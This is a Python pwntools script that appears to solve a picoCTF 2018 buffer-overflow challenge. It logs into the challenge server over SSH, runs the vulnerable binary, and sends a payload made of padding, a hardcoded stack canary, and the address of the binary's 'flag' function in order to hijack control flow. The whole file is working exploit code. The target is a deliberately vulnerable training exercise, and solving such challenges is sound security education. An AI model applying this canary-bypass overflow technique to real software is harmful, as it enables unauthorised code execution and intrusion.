#!/usr/bin/env python

from pwn import *


debug = 0

user = ''
pw = ''

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa')
  p = s.process('./vuln')

binary = ELF('./vuln')

canary = '57Gh'

print (p.recvuntil('>'))
p.sendline('300')
print( p.recvuntil('>'))
p.sendline('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + canary + 'AAAABBBBCCCCDDDD' + p32(binary.symbols['flag']))
print (p.recvall())
